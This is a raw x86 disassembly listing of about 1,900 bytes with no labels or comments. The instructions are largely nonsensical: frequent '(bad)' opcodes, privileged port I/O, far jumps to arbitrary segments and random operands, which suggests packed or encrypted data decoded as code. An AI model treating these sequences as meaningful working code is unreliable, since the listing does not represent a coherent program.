  40d27d:	rol    DWORD PTR [edx+eax*1],cl
  40d280:	fsub   QWORD PTR [edx+eiz*4]
  40d283:	pushf  
  40d284:	bound  esp,QWORD PTR [ecx+0x2a]
  40d287:	push   ebp
  40d288:	(bad)  
  40d289:	cmp    al,0xce
  40d28b:	adc    al,0xef
  40d28d:	sahf   
  40d28e:	sub    eax,0x535f0505
  40d293:	inc    edx
  40d294:	inc    esp
  40d295:	loopne 0x40d23e
  40d297:	inc    ebx
  40d298:	or     eax,0x41285c72
  40d29d:	pop    es
  40d29e:	clc    
  40d29f:	jecxz  0x40d28b
  40d2a1:	sbb    eax,0xa01eb845
  40d2a6:	jo     0x40d265
  40d2a8:	cld    
  40d2a9:	adc    BYTE PTR [edx],ah
  40d2ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2ac:	mov    al,ds:0x9307a4d
  40d2b1:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2b3:	jo     0x40d278
  40d2b5:	inc    ebp
  40d2b6:	lock repnz (bad) 
  40d2ba:	mov    esp,0xa374895d
  40d2bf:	jl     0x40d244
  40d2c1:	and    cl,0x5b
  40d2c4:	js     0x40d29a
  40d2c6:	mov    ecx,0xb3269996
  40d2cb:	daa    
  40d2cc:	int3   
  40d2cd:	hlt    
  40d2ce:	cli    
  40d2cf:	jno    0x40d34e
  40d2d1:	add    cl,BYTE PTR [ebx]
  40d2d3:	sub    al,0xde
  40d2d5:	mov    bl,0xf
  40d2d7:	les    ecx,FWORD PTR ds:0x5c995438
  40d2dd:	push   0x3675b768
  40d2e2:	push   eax
  40d2e3:	aad    0xc8
  40d2e5:	push   ds
  40d2e6:	dec    ebp
  40d2e7:	jmp    0x40d2f4
  40d2e9:	test   BYTE PTR [ecx-0x1a],bl
  40d2ec:	dec    bx
  40d2ee:	mov    ebx,DWORD PTR [edx]
  40d2f0:	mov    bh,BYTE PTR [eax]
  40d2f2:	push   ds
  40d2f3:	rcl    bh,0x8
  40d2f6:	shr    BYTE PTR [esi-0x3e],1
  40d2f9:	lahf   
  40d2fa:	in     al,0xae
  40d2fc:	es stos BYTE PTR es:[edi],al
  40d2fe:	out    dx,al
  40d2ff:	stos   DWORD PTR es:[edi],eax
  40d300:	jb     0x40d2ee
  40d302:	and    eax,0xc6c436be
  40d307:	popa   
  40d308:	or     edx,ebx
  40d30a:	xor    ch,dh
  40d30c:	pop    es
  40d30d:	fld    TBYTE PTR [ebx]
  40d30f:	push   ds
  40d310:	xchg   esp,eax
  40d311:	out    dx,eax
  40d312:	je     0x40d304
  40d314:	inc    esi
  40d315:	mov    esi,0x6cf88569
  40d31a:	push   es
  40d31b:	add    DWORD PTR [edx-0x2c],esi
  40d31e:	(bad)  
  40d31f:	stc    
  40d320:	add    dh,BYTE PTR [ecx]
  40d322:	push   cs
  40d323:	push   ds
  40d324:	mov    ah,0xca
  40d326:	or     esi,DWORD PTR [edx-0xc]
  40d329:	pop    edx
  40d32a:	into   
  40d32b:	sub    ebp,DWORD PTR [ecx+0x3a]
  40d32e:	in     eax,0x6d
  40d330:	or     BYTE PTR [ebx],al
  40d332:	jo     0x40d305
  40d334:	(bad)  
  40d335:	imul   esp,DWORD PTR [eax-0x1a504f5],0x3f67ad78
  40d33f:	jg     0x40d347
  40d341:	or     BYTE PTR [edi+ebp*8],0xa6
  40d345:	push   edi
  40d346:	outs   dx,BYTE PTR ds:[esi]
  40d347:	xchg   ebx,eax
  40d348:	aam    0xf
  40d34a:	jmp    0x40d3bd
  40d34c:	inc    DWORD PTR [ecx]
  40d34e:	cmp    ebp,DWORD PTR [edx]
  40d350:	das    
  40d351:	test   eax,0xc3a03bb8
  40d356:	sbb    DWORD PTR [ecx+ecx*4+0x58da5a71],ebx
  40d35d:	cdq    
  40d35e:	(bad)  
  40d35f:	std    
  40d360:	xor    DWORD PTR [edi-0x32],ebx
  40d363:	and    esp,esi
  40d365:	adc    BYTE PTR [esp+edx*1-0x18],al
  40d369:	pop    ecx
  40d36a:	hlt    
  40d36b:	xchg   esp,eax
  40d36c:	xchg   ebx,eax
  40d36d:	out    0xa2,al
  40d36f:	inc    esp
  40d370:	ror    eax,1
  40d372:	pop    ds
  40d373:	sbb    ebp,DWORD PTR [esp+ecx*1]
  40d376:	(bad)  
  40d377:	std    
  40d378:	add    dh,al
  40d37a:	sbb    ebp,DWORD PTR [ecx]
  40d37c:	jge    0x40d366
  40d37e:	lock and BYTE PTR [ebp+0x7a54f3d6],dh
  40d385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d386:	test   eax,0x5c65e57b
  40d38b:	pop    eax
  40d38c:	mov    edi,0xe5a56247
  40d391:	stc    
  40d392:	imul   ebp,DWORD PTR [esi-0x5cb3c97c],0xffffffd4
  40d399:	and    al,0x3f
  40d39b:	add    ebx,DWORD PTR [ebp+ebp*2-0x16eb6587]
  40d3a2:	add    BYTE PTR [ebx+0x2a44a8a5],al
  40d3a8:	jae    0x40d3d1
  40d3aa:	xchg   ecx,eax
  40d3ab:	retf   0xcade
  40d3ae:	jmp    0x2be:0x10f570c1
  40d3b5:	imul   edx,DWORD PTR [eax],0xfffffffd
  40d3b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3b9:	sbb    ecx,DWORD PTR [ecx-0x49dc6d09]
  40d3bf:	jmp    0x8f31:0x88acd6f0
  40d3c6:	adc    edi,eax
  40d3c8:	sbb    al,0x94
  40d3ca:	mov    esp,0xb0079bfb
  40d3cf:	push   es
  40d3d0:	fs or  eax,0x179be605
  40d3d6:	inc    ebx
  40d3d7:	sbb    ch,BYTE PTR [edx]
  40d3d9:	clc    
  40d3da:	aas    
  40d3db:	dec    edx
  40d3dc:	mov    dl,BYTE PTR [ecx-0x6f]
  40d3df:	mov    ds:0x74494a50,al
  40d3e4:	adc    esp,DWORD PTR [esi+0x1b6ee8de]
  40d3ea:	retf   0xd0d9
  40d3ed:	outs   dx,DWORD PTR ds:[esi]
  40d3ee:	fild   QWORD PTR [eax-0x26256e4]
  40d3f4:	pop    ebp
  40d3f5:	push   0xffffff9d
  40d3f7:	push   cs
  40d3f8:	or     edi,DWORD PTR [esi+0x51]
  40d3fb:	mov    bh,0x87
  40d3fd:	pop    ds
  40d3fe:	jg     0x40d457
  40d400:	and    eax,0x6aa8a4a1
  40d405:	push   esp
  40d406:	add    eax,0x1aec70ad
  40d40b:	lock push 0x5f
  40d40e:	add    eax,0x7bb6412
  40d413:	dec    ecx
  40d414:	das    
  40d415:	mov    ebp,0xd1cb686f
  40d41a:	mov    bl,0xfe
  40d41c:	inc    ebp
  40d41d:	mov    bh,0xd4
  40d41f:	int3   
  40d420:	sub    eax,0xf44204c8
  40d425:	sbb    eax,0x3fba942f
  40d42a:	mov    al,BYTE PTR [eax-0x66]
  40d42d:	adc    eax,0xc2546510
  40d432:	mov    ch,0x51
  40d434:	dec    edi
  40d435:	jl     0x40d463
  40d437:	and    edx,DWORD PTR ds:0xb10d4d3c
  40d43d:	mov    ecx,0xbec1e0a8
  40d442:	push   cs
  40d443:	xchg   edx,eax
  40d444:	je     0x40d457
  40d446:	or     ah,ah
  40d448:	dec    esi
  40d449:	shl    BYTE PTR [eax],0xd5
  40d44c:	popa   
  40d44d:	push   0xffffffa6
  40d44f:	mov    ah,0xcc
  40d451:	push   ebx
  40d452:	lock mov dl,0xa5
  40d455:	mov    WORD PTR [ebp+0x3d020a69],ds
  40d45b:	mov    ds:0xb6032fd2,eax
  40d460:	adc    ah,bl
  40d462:	(bad)  
  40d463:	aad    0x32
  40d465:	addr16 aad 0x69
  40d468:	add    al,0x85
  40d46a:	mov    BYTE PTR [ebx+0x6f4a191f],al
  40d470:	pop    ss
  40d471:	gs in  eax,0x2d
  40d474:	dec    ebx
  40d475:	mov    ch,0xf8
  40d477:	stos   BYTE PTR es:[edi],al
  40d478:	sub    esp,DWORD PTR [ebp+0x46]
  40d47b:	addr16 mov ebx,0x3de82315
  40d481:	mov    dl,0x8b
  40d483:	dec    ebp
  40d484:	clc    
  40d485:	mov    DWORD PTR [ecx+0x10],eax
  40d488:	mov    eax,eax
  40d48a:	jmp    0x40d995
  40d48f:	ror    al,0xcc
  40d492:	cmp    eax,0xd5d9c1d4
  40d497:	jg     0x40d500
  40d499:	jne    0x40d439
  40d49b:	pop    edx
  40d49c:	or     eax,0xb5cca4e0
  40d4a1:	js     0x40d51b
  40d4a3:	push   0x7c
  40d4a5:	js     0x40d51f
  40d4a7:	fmul   DWORD PTR [ecx+0x54]
  40d4aa:	enter  0x8fd8,0x4c
  40d4ae:	or     ah,BYTE PTR [ecx]
  40d4b0:	jbe    0x40d50d
  40d4b2:	lods   al,BYTE PTR ds:[esi]
  40d4b3:	cdq    
  40d4b4:	fbstp  TBYTE PTR [esi]
  40d4b6:	jle    0x40d497
  40d4b8:	inc    ebp
  40d4b9:	xor    ch,BYTE PTR [ebx-0x582956f7]
  40d4bf:	jnp    0x40d502
  40d4c1:	add    BYTE PTR [edx],dh
  40d4c3:	mov    dl,0x66
  40d4c5:	jno    0x40d4a1
  40d4c7:	adc    DWORD PTR [edi*2-0x6281ef93],ebp
  40d4ce:	add    al,0xa1
  40d4d0:	out    0x14,eax
  40d4d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4d3:	push   esi
  40d4d4:	mov    edi,0x83cb54c4
  40d4d9:	jmp    0x40d4f6
  40d4db:	nop
  40d4dc:	hlt    
  40d4dd:	add    dl,BYTE PTR [edi]
  40d4df:	push   edx
  40d4e0:	pop    eax
  40d4e1:	scas   eax,DWORD PTR es:[edi]
  40d4e2:	outs   dx,DWORD PTR ds:[esi]
  40d4e3:	dec    esi
  40d4e4:	inc    ecx
  40d4e5:	sbb    BYTE PTR [edx-0x33aaae1c],cl
  40d4eb:	les    eax,FWORD PTR [esi+0x59]
  40d4ee:	cmp    eax,ebp
  40d4f0:	sub    BYTE PTR [ebx],dl
  40d4f2:	add    eax,0xbd9f5fe
  40d4f7:	nop
  40d4f8:	out    0x10,al
  40d4fa:	jae    0x40d49e
  40d4fc:	sbb    eax,0xc51a352a
  40d501:	fnstenv [ecx]
  40d503:	xor    BYTE PTR [ebx-0x651d184d],bh
  40d509:	or     al,0x60
  40d50b:	mov    ebx,0xe43c6403
  40d510:	shr    DWORD PTR [edx+edi*8+0x12842176],0x9e
  40d518:	adc    al,0x61
  40d51a:	sbb    al,BYTE PTR [esi+0x743a1b00]
  40d520:	mov    esi,DWORD PTR [ecx+0x47a20bd0]
  40d526:	or     esi,DWORD PTR [ebx-0x2a]
  40d529:	jae    0x40d4d7
  40d52b:	push   es
  40d52c:	int    0x5a
  40d52e:	push   ds
  40d52f:	cmp    dh,dh
  40d531:	fsubrp st(7),st
  40d533:	xor    eax,0xef2a070e
  40d538:	ret    0xd123
  40d53b:	push   esi
  40d53c:	mov    dh,BYTE PTR [edi-0x32]
  40d53f:	jg     0x40d591
  40d541:	xor    eax,0x706861dc
  40d546:	jns    0x40d545
  40d548:	and    eax,0x1c8901cc
  40d54d:	lods   al,BYTE PTR ds:[esi]
  40d54e:	fcmovnu st,st(3)
  40d550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d551:	mov    al,0xb4
  40d553:	in     al,0x84
  40d555:	jne    0x40d56b
  40d557:	cmp    eax,0xb3f97dba
  40d55c:	das    
  40d55d:	pop    edi
  40d55e:	repnz sar al,0x1a
  40d562:	push   ecx
  40d563:	ret    0xc950
  40d566:	outs   dx,DWORD PTR ds:[esi]
  40d567:	sbb    DWORD PTR [esp+ebx*4-0x5659abb1],ebp
  40d56e:	inc    esi
  40d56f:	fucomp st(0)
  40d571:	sbb    al,0xa
  40d573:	(bad)  
  40d574:	adc    al,BYTE PTR [ebx-0x28]
  40d577:	jns    0x40d54b
  40d579:	mov    bl,0xf7
  40d57b:	pop    eax
  40d57c:	cmp    al,0x43
  40d57e:	loopne 0x40d528
  40d580:	fisttp DWORD PTR [ebp-0x24]
  40d583:	test   al,0x8b
  40d585:	xor    al,0xac
  40d587:	jno    0x40d531
  40d589:	xchg   esi,eax
  40d58a:	stc    
  40d58b:	sbb    eax,0x2afc6e3e
  40d590:	test   eax,0x2112bdde
  40d595:	dec    ebx
  40d596:	jecxz  0x40d520
  40d598:	push   cs
  40d599:	pop    es
  40d59a:	je     0x40d548
  40d59c:	dec    ecx
  40d59d:	and    eax,0xffffff97
  40d5a0:	jne    0x40d5b1
  40d5a2:	stos   DWORD PTR es:[edi],eax
  40d5a3:	push   ss
  40d5a4:	push   ss
  40d5a5:	retf   
  40d5a6:	outs   dx,BYTE PTR ds:[esi]
  40d5a7:	lods   eax,DWORD PTR ds:[esi]
  40d5a8:	adc    DWORD PTR [ebx+0x0],eax
  40d5ab:	pop    esp
  40d5ac:	je     0x40d5a2
  40d5ae:	sbb    al,0x6f
  40d5b0:	and    DWORD PTR [ebx+0x38],ecx
  40d5b3:	into   
  40d5b4:	outs   dx,DWORD PTR ds:[esi]
  40d5b5:	fwait
  40d5b6:	bound  ebp,QWORD PTR [ecx+ecx*2]
  40d5b9:	(bad)  
  40d5ba:	cmp    ah,ah
  40d5bc:	mov    ebx,0xe41b81b2
  40d5c1:	push   ss
  40d5c2:	and    DWORD PTR [edi+0x7140755e],0xffffff97
  40d5c9:	xchg   esi,eax
  40d5ca:	push   eax
  40d5cb:	mov    ch,ch
  40d5cd:	push   es
  40d5ce:	push   edx
  40d5cf:	int    0x3
  40d5d1:	xor    eax,0x38988c5c
  40d5d6:	lds    eax,FWORD PTR [ebx+0x28bd52a]
  40d5dc:	(bad)  
  40d5dd:	lea    ecx,[ebx]
  40d5df:	xor    BYTE PTR ds:0xc3cb9d6c,ch
  40d5e5:	es push eax
  40d5e7:	pop    ebp
  40d5e8:	xchg   edx,eax
  40d5e9:	inc    ebx
  40d5ea:	cmp    eax,0x6ce54cc8
  40d5ef:	retf   0x3317
  40d5f2:	ret    
  40d5f3:	stos   BYTE PTR es:[edi],al
  40d5f4:	gs jne 0x40d66f
  40d5f7:	push   0xd8921b4b
  40d5fc:	test   eax,0x85afbbee
  40d601:	sub    DWORD PTR [esi],edi
  40d603:	daa    
  40d604:	jmp    0x62ce:0x8d88a382
  40d60b:	mov    eax,ds:0x3a13dbc5
  40d610:	aad    0x3b
  40d612:	dec    ebp
  40d613:	sub    DWORD PTR [edx-0x7e],esp
  40d616:	std    
  40d617:	mov    ds:0x9ee0c4e9,al
  40d61c:	ds mov ah,0xbb
  40d61f:	cmp    BYTE PTR [ecx],bh
  40d621:	(bad)  
  40d622:	and    al,0xa5
  40d624:	xor    dh,cl
  40d626:	jmp    0x40d68c
  40d628:	outs   dx,DWORD PTR ds:[esi]
  40d629:	out    0xd1,eax
  40d62b:	sar    DWORD PTR [ecx+0x223d0801],1
  40d631:	retf   0x9fe1
  40d634:	jl     0x40d614
  40d636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d637:	jp     0x40d5fd
  40d639:	cmc    
  40d63a:	push   cs
  40d63b:	xor    al,0x6f
  40d63d:	imul   esp,DWORD PTR [edx+0x4ade2719],0xa56b2a3a
  40d647:	into   
  40d648:	jne    0x40d64d
  40d64a:	test   DWORD PTR [eax-0x51],ebp
  40d64d:	mov    ebp,0x825c83dd
  40d652:	xor    eax,ebp
  40d654:	xor    eax,DWORD PTR [esi]
  40d656:	xchg   edi,eax
  40d657:	loop   0x40d6bb
  40d659:	jmp    0x43f74a84
  40d65e:	mov    al,0xae
  40d660:	and    eax,DWORD PTR [ecx+0x1516d193]
  40d666:	es pushf 
  40d668:	adc    eax,0x7a17857d
  40d66d:	rcl    BYTE PTR [esp+esi*8-0x50049e9e],1
  40d674:	mov    eax,ecx
  40d676:	and    dh,dh
  40d678:	test   al,0xce
  40d67a:	sbb    edi,DWORD PTR [esi]
  40d67c:	jecxz  0x40d67a
  40d67e:	sbb    al,bl
  40d680:	daa    
  40d681:	jnp    0x40d65a
  40d683:	cwde   
  40d684:	out    0xbd,eax
  40d686:	(bad)  
  40d687:	xlat   BYTE PTR ds:[ebx]
  40d688:	lock sub ch,BYTE PTR [ecx+0x6daee40d]
  40d68f:	sub    esi,0xf323ee2f
  40d695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d696:	test   al,0xb7
  40d698:	xchg   BYTE PTR ds:0xa3ed0fc4,ch
  40d69e:	xor    DWORD PTR [ebx+0x449f067f],ebx
  40d6a4:	dec    edx
  40d6a5:	jns    0x40d682
  40d6a7:	xor    ecx,DWORD PTR [esi-0x26871985]
  40d6ad:	mov    edi,0x1185b7bd
  40d6b2:	pop    DWORD PTR [ebp-0x6c]
  40d6b5:	jmp    0x40d6a2
  40d6b7:	ins    DWORD PTR es:[edi],dx
  40d6b8:	pop    ebp
  40d6b9:	nop
  40d6ba:	mov    dl,0xaa
  40d6bc:	dec    esi
  40d6bd:	(bad)  
  40d6be:	jmp    0x79ee851d
  40d6c3:	outs   dx,BYTE PTR ds:[esi]
  40d6c4:	or     BYTE PTR [edi+ecx*2+0x2577d88b],bl
  40d6cb:	add    al,0xe8
  40d6cd:	sbb    al,0x4f
  40d6cf:	xlat   BYTE PTR ds:[ebx]
  40d6d0:	fidiv  DWORD PTR [edi]
  40d6d2:	inc    ebp
  40d6d3:	stc    
  40d6d4:	jmp    0x2fe4:0x98f0a18a
  40d6db:	xlat   BYTE PTR ds:[ebx]
  40d6dc:	dec    ebp
  40d6dd:	cmp    BYTE PTR [esi*4+0x1b809a55],ah
  40d6e4:	icebp  
  40d6e5:	leave  
  40d6e6:	mov    eax,ds:0x6b50cd27
  40d6eb:	or     al,0xb0
  40d6ed:	sbb    eax,0x4d2d295d
  40d6f2:	mov    ebx,0xc8b2136b
  40d6f7:	ss leave 
  40d6f9:	out    0xb5,eax
  40d6fb:	xor    cl,BYTE PTR [esi]
  40d6fd:	add    DWORD PTR [ebx],ebp
  40d6ff:	retf   
  40d700:	jo     0x40d6d3
  40d702:	mov    ah,0x70
  40d704:	xchg   esi,eax
  40d705:	retf   
  40d706:	cmp    DWORD PTR [ebx+0x3713265a],ecx
  40d70c:	inc    edi
  40d70d:	pushf  
  40d70e:	out    dx,al
  40d70f:	imul   ebp,DWORD PTR [eax-0x24],0x3f000507
  40d716:	imul   esi,DWORD PTR [ebp-0x39cdc308],0x22
  40d71d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d71e:	mov    edi,0xdd692f70
  40d723:	inc    eax
  40d724:	jle    0x40d791
  40d726:	cdq    
  40d727:	lock jl 0x40d789
  40d72a:	aam    0x9
  40d72c:	sub    ebx,esi
  40d72e:	ret    0x80d5
  40d731:	dec    ebp
  40d732:	imul   ebx,DWORD PTR [edi-0x6],0x58
  40d736:	push   esp
  40d737:	cld    
  40d738:	(bad)  
  40d73a:	cmp    BYTE PTR [ebx+0x18301170],bl
  40d740:	ror    esi,cl
  40d742:	mov    esi,0xf32149
  40d747:	out    0x5,eax
  40d749:	mov    bh,0x57
  40d74b:	neg    BYTE PTR [ebp+edx*2+0x3779d8d7]
  40d752:	cmp    dh,BYTE PTR [ebx]
  40d754:	aaa    
  40d755:	sar    BYTE PTR [ebx-0x6fdf2e32],0x65
  40d75c:	int3   
  40d75d:	push   ecx
  40d75e:	out    0x6,al
  40d760:	stos   BYTE PTR es:[edi],al
  40d761:	pop    edx
  40d762:	jbe    0x40d791
  40d764:	pop    ebx
  40d765:	cmp    ebx,ebp
  40d767:	nop
  40d768:	push   ds
  40d769:	sub    DWORD PTR [ebx],edx
  40d76b:	pop    es
  40d76c:	ins    BYTE PTR es:[edi],dx
  40d76d:	jge    0x40d7ae
  40d76f:	xchg   BYTE PTR [esi+edi*8],bh
  40d772:	repz inc eax
  40d774:	pop    edx
  40d775:	mov    ebx,0xa196dfaa
  40d77a:	pop    esi
  40d77b:	mov    dl,0x17
  40d77d:	sub    DWORD PTR [ebx+0x4998a612],eax
  40d783:	neg    BYTE PTR [eax-0x33]
  40d786:	or     edx,DWORD PTR [ebp-0x34c8d12a]
  40d78c:	sub    DWORD PTR [ecx],ecx
  40d78e:	aas    
  40d78f:	jb     0x40d788
  40d791:	mov    edx,0x2aac7a69
  40d796:	xor    al,0x41
  40d798:	dec    esp
  40d799:	sub    eax,0x689cd0fb
  40d79e:	int3   
  40d79f:	jne    0x40d7d6
  40d7a1:	hlt    
  40d7a2:	sub    ecx,edi
  40d7a4:	cmp    al,0x3
  40d7a6:	pop    edi
  40d7a7:	dec    ebx
  40d7a8:	repnz adc eax,esp
  40d7ab:	pushw  ss
  40d7ad:	mov    bl,0x27
  40d7af:	fwait
  40d7b0:	mov    ebp,0x94f4cf1f
  40d7b5:	jo     0x40d7ea
  40d7b7:	popa   
  40d7b8:	fbstp  TBYTE PTR [eax-0x29]
  40d7bb:	mov    DWORD PTR [ebx],ebx
  40d7bd:	lea    ebp,[edi]
  40d7bf:	inc    edx
  40d7c0:	add    eax,0xabdea2ad
  40d7c5:	clc    
  40d7c6:	mov    al,ds:0x1136571c
  40d7cb:	and    DWORD PTR [edi+0x6ca19ba7],eax
  40d7d1:	and    DWORD PTR ds:[edi],ebp
  40d7d4:	cmp    BYTE PTR [edi-0x54aad54],ah
  40d7da:	ret    
  40d7db:	mov    cl,0xfa
  40d7dd:	retf   
  40d7de:	ds mov cx,0x4ec1
  40d7e3:	mov    ecx,ebp
  40d7e5:	sbb    eax,0x687f84c8
  40d7ea:	cmp    al,0x90
  40d7ec:	ins    DWORD PTR es:[edi],dx
  40d7ed:	jb     0x40d825
  40d7ef:	mov    al,ds:0xb52ee7ad
  40d7f4:	xlat   BYTE PTR ds:[ebx]
  40d7f5:	leave  
  40d7f6:	mov    ds:0xbd71ca5b,eax
  40d7fb:	xor    al,ah
  40d7fd:	dec    esp
  40d7fe:	mov    ch,0x7
  40d800:	mov    WORD PTR [ebp+0x9],?
  40d803:	dec    esi
  40d804:	lds    esi,FWORD PTR [eax+0x3e929cc9]
  40d80a:	in     eax,0x2b
  40d80c:	mov    eax,0x7407b9e
  40d811:	ds in  eax,0xb7
  40d814:	std    
  40d815:	pop    ebp
  40d816:	jmp    0x40d7c5
  40d818:	das    
  40d819:	pop    esp
  40d81a:	(bad)  
  40d81c:	aas    
  40d81d:	push   ds
  40d81e:	retf   
  40d81f:	out    0xc5,eax
  40d821:	adc    al,0x54
  40d823:	adc    eax,0x3ae1d55c
  40d828:	inc    edx
  40d829:	xchg   edx,eax
  40d82a:	inc    ebx
  40d82b:	test   al,0xb1
  40d82d:	ds daa 
  40d82f:	mov    dl,0x17
  40d831:	test   al,0x29
  40d833:	add    ah,ch
  40d835:	je     0x40d82d
  40d837:	stos   BYTE PTR es:[edi],al
  40d838:	jg     0x40d7e6
  40d83a:	and    edi,ecx
  40d83c:	push   ecx
  40d83d:	dec    edi
  40d83e:	test   ebp,edi
  40d840:	push   es
  40d841:	pop    ss
  40d842:	push   ss
  40d843:	test   al,0xbe
  40d845:	add    BYTE PTR [edi+0xc3c85e4],bh
  40d84b:	call   0x4b733444
  40d850:	push   0x9c566359
  40d855:	push   edx
  40d856:	xchg   edi,eax
  40d857:	mov    edi,0x15f19b41
  40d85c:	data16 scas al,BYTE PTR es:[edi]
  40d85e:	mov    BYTE PTR ds:[eax+0x4],0xcc
  40d863:	sub    ebp,DWORD PTR [esi-0x34]
  40d866:	lods   eax,DWORD PTR ds:[esi]
  40d867:	iret   
  40d868:	fwait
  40d869:	sub    eax,0x3f8d9f43
  40d86e:	push   edx
  40d870:	fcom   QWORD PTR [eax]
  40d872:	add    BYTE PTR cs:[edi],dl
  40d875:	rcr    BYTE PTR [eax+eax*1],cl
  40d878:	rol    DWORD PTR [esp+esi*2],1
  40d87b:	push   0x7b8ad458
  40d880:	push   eax
  40d881:	pop    esi
  40d882:	ins    DWORD PTR es:[edi],dx
  40d883:	inc    ebp
  40d884:	xchg   ebx,eax
  40d885:	loopne 0x40d84a
  40d887:	xchg   esp,eax
  40d888:	loop   0x40d84e
  40d88a:	mov    ah,0xe3
  40d88c:	push   ds
  40d88d:	sub    eax,0x6329fc13
  40d892:	retf   
  40d893:	dec    ebp
  40d894:	cmp    DWORD PTR [edx+0x431f9fbb],0xffffffbb
  40d89b:	fs push ebp
  40d89d:	loopne 0x40d886
  40d89f:	mov    edi,0x6c305d02
  40d8a4:	fsubr  QWORD PTR [edx-0xb]
  40d8a7:	adc    eax,0x47ecb50c
  40d8ac:	sbb    bl,BYTE PTR [ecx-0x130429ec]
  40d8b2:	aaa    
  40d8b3:	dec    esp
  40d8b4:	mov    eax,esi
  40d8b6:	pop    ebx
  40d8b7:	cmp    al,0x28
  40d8b9:	imul   eax,DWORD PTR [ebp+0x2278ea4c],0x6a
  40d8c0:	into   
  40d8c1:	inc    eax
  40d8c2:	pop    di
  40d8c4:	push   ds
  40d8c5:	adc    ecx,eax
  40d8c7:	or     eax,0xb288cc58
  40d8cc:	xor    al,0xf5
  40d8ce:	xchg   ecx,eax
  40d8cf:	cmp    al,0x8d
  40d8d1:	fwait
  40d8d2:	test   DWORD PTR [edi-0x5d],0x2f1c9d13
  40d8d9:	fisttp DWORD PTR [eax+edx*8-0x67]
  40d8dd:	test   DWORD PTR [esi-0x56],eax
  40d8e0:	cmp    eax,0x830df786
  40d8e5:	xchg   ecx,eax
  40d8e6:	sar    BYTE PTR ds:0xaba138ce,0x57
  40d8ed:	int    0x93
  40d8ef:	sub    esi,ebp
  40d8f1:	dec    esi
  40d8f2:	rcl    BYTE PTR [esi-0x31],cl
  40d8f5:	lds    ebp,FWORD PTR [ebx]
  40d8f7:	mov    edx,0x317d92e9
  40d8fc:	das    
  40d8fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8fe:	xchg   ecx,eax
  40d8ff:	xor    DWORD PTR [edx],0x7264df47
  40d905:	sti    
  40d906:	mov    cl,0xe2
  40d908:	adc    edx,DWORD PTR [ebx+edi*8-0x7d153e15]
  40d90f:	cmp    BYTE PTR [esi+0x1e],dl
  40d912:	out    0x67,eax
  40d914:	cli    
  40d915:	push   cs
  40d916:	inc    esi
  40d917:	sbb    esp,DWORD PTR [eax+0xc6e4eef]
  40d91d:	xchg   ecx,eax
  40d91e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d91f:	pushf  
  40d920:	push   esp
  40d921:	push   esi
  40d922:	cmp    DWORD PTR [ebp+0x430850f9],0xf
  40d929:	clc    
  40d92a:	sub    dl,BYTE PTR [eax+0x6a]
  40d92d:	lock sub eax,0xada29717
  40d933:	(bad)  
  40d936:	jecxz  0x40d982
  40d938:	mov    edx,0xa99e71bc
  40d93d:	or     dl,BYTE PTR [ebx+eax*1]
  40d940:	push   es
  40d941:	cwde   
  40d942:	out    dx,al
  40d943:	(bad)  
  40d944:	aad    0x52
  40d946:	jo     0x40d8f3
  40d948:	mov    eax,0x8b8c4911
  40d94d:	je     0x40d99d
  40d94f:	inc    esp
  40d950:	shl    DWORD PTR [esi+0x56],0xa0
  40d954:	(bad)  
  40d955:	ja     0x40d911
  40d957:	pop    esp
  40d958:	push   ebx
  40d959:	ret    
  40d95a:	mov    eax,ds:0x494e6041
  40d95f:	fadd   DWORD PTR [edx]
  40d961:	jecxz  0x40d953
  40d963:	inc    edx
  40d964:	jecxz  0x40d9b9
  40d966:	cdq    
  40d967:	pop    esp
  40d968:	or     dh,bh
  40d96a:	imul   ebp,DWORD PTR [esi-0x2f9995a9],0x8699443c
  40d974:	jmp    0xdd85:0x95ce97c9
  40d97b:	push   ebp
  40d97c:	fwait
  40d97d:	push   eax
  40d97e:	dec    esi
  40d97f:	addr16 sub eax,0x857680bc
  40d985:	mov    bh,BYTE PTR [edi-0x3593a011]
  40d98b:	and    al,0xed
  40d98d:	jmp    0x5265:0x383aeefb
  40d994:	ror    BYTE PTR [ebx-0x3f7a23bb],0x8b
  40d99b:	inc    ebp
  40d99c:	aam    0xf
  40d99e:	test   DWORD PTR [ebx],eax
  40d9a0:	add    BYTE PTR [eax],al
  40d9a2:	add    BYTE PTR [ebx-0x39cc0fbb],cl
  40d9a8:	jmp    0x40deb3
  40d9ad:	rcl    dl,cl
  40d9af:	ds (bad) 
  40d9b1:	ds fcmovnu st,st(1)
  40d9b4:	fnstcw WORD PTR [esi-0x59]
  40d9b7:	sbb    BYTE PTR [edx-0x34],al
  40d9ba:	out    0x6d,al
  40d9bc:	push   ecx
  40d9bd:	ds mov eax,0x7c6a7878
  40d9c3:	js     0x40da3d
  40d9c5:	lods   al,BYTE PTR ds:[esi]
  40d9c6:	adc    BYTE PTR [edi+0x0],al
  40d9c9:	aas    
  40d9ca:	or     al,0xca
  40d9cc:	hlt    
  40d9cd:	fs test eax,0x4a019051
  40d9d3:	int    0xdb
  40d9d5:	test   al,0x8a
  40d9d7:	push   cs
  40d9d8:	jnp    0x40d98b
  40d9da:	mov    ah,0xf5
  40d9dc:	lods   al,BYTE PTR ds:[esi]
  40d9dd:	mov    ebp,0x41e70137
  40d9e2:	sbb    al,0x9f
  40d9e4:	les    edx,FWORD PTR [esi+0x50cc051f]
  40d9ea:	inc    ebx
  40d9eb:	jle    0x40d9d5
  40d9ed:	mov    ds:0xb0a6b17f,eax
  40d9f2:	inc    ecx
  40d9f3:	scas   eax,DWORD PTR es:[edi]
  40d9f4:	lock or DWORD PTR [edi+ecx*1-0x75],0x25
  40d9fa:	dec    edi
  40d9fb:	sbb    al,0xf5
  40d9fd:	retf   
  40d9fe:	inc    edi
  40d9ff:	jge    0x40d9d7
  40da01:	test   BYTE PTR [edx+0x62a9d49d],bh
  40da07:	sub    DWORD PTR [ebx-0x12],edi
  40da0a:	or     al,0xe3
  40da0c:	cs adc al,0xcb
